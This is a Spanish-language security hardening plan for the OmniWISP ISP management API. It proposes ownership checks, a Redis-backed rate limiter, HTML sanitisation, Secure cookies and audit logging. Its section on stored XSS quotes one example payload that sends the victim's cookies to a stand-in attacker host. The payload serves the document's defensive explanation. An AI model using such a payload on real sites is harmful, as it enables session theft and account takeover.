# Propuestas de Optimización y Robustecimiento de Seguridad en Endpoints

Este documento analiza los vectores de ataque más comunes sobre APIs y expone un plan técnico de robustecimiento para los endpoints de **OmniWISP**. Las soluciones propuestas están adaptadas a la arquitectura actual basada en **FastAPI**, **SQLModel/SQLAlchemy**, **FastAPI-Users** y **Redict (Redis)**.

---

## 1. Prevención de BOLA/IDOR (Broken Object Level Authorization)

### Diagnóstico
Actualmente, el sistema cuenta con controles de acceso basados en roles (`RoleChecker` en `app/core/users.py`) que restringen el acceso a nivel de endpoints (ej. solo personal de facturación puede consultar clientes). Sin embargo, en el portal de clientes (`app/api/portal/main.py`), si un cliente autenticado intenta manipular directamente IDs de recursos (como tickets o servicios) en las URLs, el sistema debe garantizar de forma estricta que esos recursos le pertenezcan.

### Propuesta Técnica: Dependencia de Verificación de Propiedad
Se propone implementar una dependencia inyectable en `app/core/security/ownership.py` para desacoplar la lógica de autorización del negocio.

```python
# app/core/security/ownership.py
import uuid
from fastapi import Depends, HTTPException, status
from app.core.users import current_active_user
from app.models.user import User

async def verify_client_ownership(
    client_id: uuid.UUID,
    current_user: User = Depends(current_active_user)
) -> uuid.UUID:
    """
    Dependencia de seguridad para validar que el usuario con rol de cliente
    únicamente pueda acceder o modificar datos pertenecientes a su propio client_id.
    
    Administradores, técnicos y personal de facturación omiten esta verificación.
    """
    # Si es un usuario cliente, forzar que coincida con su client_id
    if current_user.role == "client":
        if current_user.client_id != client_id:
            # Se devuelve 404 en lugar de 403 para no revelar la existencia del ID
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Recurso no encontrado."
            )
            
    return client_id
```

### Aplicación en Rutas
Esta dependencia se inyecta directamente en las rutas sensibles de consulta o mutación:

```python
# app/api/clients/main.py (Ejemplo de aplicación)
from app.core.security.ownership import verify_client_ownership
from app.core.security import require_client

@router.get("/clients/{client_id}/cpes", response_model=list[AssignedCPE])
def api_get_cpes_for_client(
    client_id: uuid.UUID = Depends(verify_client_ownership),
    current_user: User = Depends(require_client),
    service: ClientManagerService = Depends(get_client_service),
):
    """
    Obtiene los CPEs del cliente. 
    Gracias a verify_client_ownership, un cliente solo puede ver sus propios CPEs,
    mientras que el personal técnico/administrador mantiene acceso global.
    """
    return service.get_cpes_for_client(client_id)
```

---

## 2. Rate Limiting Persistente con Redict (Redis)

### Diagnóstico
En `app/main.py`, los endpoints sensibles de autenticación (`/auth/cookie/login`, `/auth/register` y `/auth/jwt/login`) están protegidos mediante un middleware personalizado de limitación de tasa (`rate_limit_middleware`) estructurado en memoria:
```python
_rate_limit_store: dict[str, list[float]] = defaultdict(list)
```
**Riesgo:** 
1. **Volatilidad:** Cada vez que el contenedor de FastAPI se reinicia, el registro de rate limits se pierde.
2. **Escalabilidad:** Si OmniWISP se despliega en alta disponibilidad (detrás de un balanceador de carga con múltiples instancias del backend), los atacantes pueden distribuir sus peticiones eludiendo el límite por nodo.

### Propuesta Técnica: Integración con Redict
Dado que OmniWISP ya integra soporte nativo para Redict como caché distribuida, se propone migrar el limitador global de **SlowAPI** para utilizar el backend de Redis.

```python
# app/main.py (Modificación de configuración de SlowAPI)
from slowapi import Limiter
from slowapi.util import get_remote_address
from app.core.config import settings

# Configurar almacenamiento persistente de tasa usando Redict
if settings.CACHE_BACKEND == "redict" and settings.REDICT_URL:
    limiter = Limiter(
        key_func=get_remote_address,
        storage_uri=settings.REDICT_URL # ej: redis://redict:6379/1
    )
    print("🛡️ [Rate Limiting] Configurado almacenamiento persistente en Redict")
else:
    limiter = Limiter(key_func=get_remote_address)
    print("⚠️ [Rate Limiting] Configurado en memoria local (no persistente)")

app.state.limiter = limiter
```

---

## 3. Sanitización de Datos de Entrada (Prevenir Stored XSS e Inyecciones HTML)

### Diagnóstico
Los esquemas de validación de Pydantic bloquean tipos de datos corruptos, pero los campos string libres (como el asunto y contenido de un ticket de soporte en el portal, o los comentarios del técnico) se almacenan tal cual se reciben en la base de datos PostgreSQL. 
Si un atacante inyecta scripts HTML como:
`<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`
Este script malicioso se guardará en base de datos y podría ejecutarse en el panel del administrador o técnico al visualizar el ticket (Stored XSS).

### Propuesta Técnica: Sanitización en Schemas
Se sugiere utilizar la librería `bleach` en los validadores de los esquemas de entrada de Pydantic para eliminar scripts y tags HTML indeseados antes de persistir los datos.

```python
# app/schemas/portal_announcement.py o app/schemas/ticket.py (Concepto)
import bleach
from pydantic import BaseModel, field_validator

class PortalTicketCreate(BaseModel):
    subject: str
    description: str

    @field_validator("subject", "description")
    @classmethod
    def sanitize_html(cls, value: str) -> str:
        if value:
            # Elimina absolutamente todo tag HTML y escapa caracteres especiales
            return bleach.clean(value, tags=[], strip=True)
        return value
```

---

## 4. Configuración Segura de Cookies de Sesión (`SameSite` y `Secure`)

### Diagnóstico
En `app/core/users.py`, la cookie de autenticación de sesión se configura de la siguiente manera:
```python
cookie_transport = CookieTransport(
    cookie_name=ACCESS_TOKEN_COOKIE_NAME,
    cookie_max_age=ACCESS_TOKEN_LIFETIME_SECONDS,
    cookie_httponly=True,  # Excelente: previene lectura por Javascript
    cookie_secure=False,   # ⚠️ Permite transmisión sin cifrar (HTTP)
    cookie_samesite="lax",
)
```
Tener `cookie_secure=False` es una comodidad necesaria para implementaciones LAN domésticas sin certificados SSL en servidores MikroTik/WISP locales. No obstante, si el sistema es expuesto a Internet, esto permite ataques de sniffing de credenciales sobre redes públicas.

### Propuesta Técnica: Dynamic Cookie Security
Se sugiere alternar el comportamiento de seguridad de la cookie según el entorno definido en las variables de entorno (`APP_ENV`).

```python
# app/core/users.py (Modificación)
from app.core.config import settings

cookie_transport = CookieTransport(
    cookie_name=ACCESS_TOKEN_COOKIE_NAME,
    cookie_max_age=ACCESS_TOKEN_LIFETIME_SECONDS,
    cookie_httponly=True,  # Mantiene protección XSS
    # Obliga al navegador a enviar la cookie ÚNICAMENTE por HTTPS en producción
    cookie_secure=settings.APP_ENV == "production", 
    cookie_samesite="lax",
)
```

---

## 5. Auditoría Activa de Acciones Críticas de Aprovisionamiento

### Diagnóstico
OmniWISP interactúa directamente con hardware de red sensible (MikroTik Routers, Switches). Los endpoints que modifican colas simples, perfiles PPPoE o credenciales de conexión representan un objetivo de alto valor para intrusos.

### Propuesta Técnica: Cobertura Completa del Log de Auditoría
El sistema ya cuenta con la utilidad `log_action` (importada desde `app.core.audit`). Se propone garantizar que todas las mutaciones críticas en routers y planes se registren de forma detallada:

```python
# app/api/clients/main.py
@router.put("/services/{service_id}/plan")
def api_change_service_plan(
    service_id: int,
    new_plan_id: int,
    request: Request, # Requerido para capturar la IP de origen
    service: ClientManagerService = Depends(get_client_service),
    current_user: User = Depends(require_billing),
):
    from ...core.audit import log_action

    result = service.change_client_service_plan(service_id, new_plan_id)
    
    # Registrar auditoría de cambio de plan y sincronización de hardware
    log_action(
        action="UPDATE_PLAN",
        entity_type="client_service",
        entity_id=str(service_id),
        user=current_user,
        request=request,
        details=f"Cambiado al plan ID: {new_plan_id}. Sincronización en router MikroTik completada."
    )
    return result
```

---

## 6. Asegurar la Inicialización del Sistema (Setup/Instalador Web)

### Diagnóstico
El endpoint `/api/setup` en `app/api/setup/main.py` está diseñado para crear el primer usuario administrador durante el primer arranque del servidor. El sistema incluye una validación correcta de base de datos para no permitir accesos si ya existe algún usuario:
```python
if await _is_system_setup(session):
    raise HTTPException(status_code=403, detail="El sistema ya está configurado...")
```

### Propuesta Técnica: Bloqueo de Rutas a Nivel de Middleware
Para evitar escaneos de endpoints o ataques de denegación de servicio intentando forzar el procesamiento del instalador, se sugiere que el `SetupMiddleware` (`app/middleware/setup_middleware.py`) intercepte y rechace con código `404` cualquier intento de acceso a `/api/setup` si la base de datos ya contiene un administrador inicial, de modo que las rutas de instalación dejen de existir virtualmente para usuarios externos una vez configuradas.

---

## Plan de Acción Recomendado

1. **Corto Plazo (Seguridad Crítica)**:
   - Implementar `verify_client_ownership` en los routers del Portal de Clientes (`app/api/portal/main.py`) para mitigar cualquier riesgo de fuga de información de tickets y videollamadas.
   - Condicionar dinámicamente `cookie_secure` en base a `settings.APP_ENV`.

2. **Medio Plazo (Infraestructura)**:
   - Configurar `slowapi` con el backend de Redis (`Redict`) en `app/main.py` para contar con un rate limiter a prueba de reinicios y balanceadores.
   - Incorporar sanitización con `bleach` en campos string de tickets de soporte y respuestas en el chat.

3. **Mantenimiento**:
   - Incrementar la cobertura de `log_action` sobre todas las llamadas que modifiquen configuraciones físicas en routers MikroTik y switches del WISP.
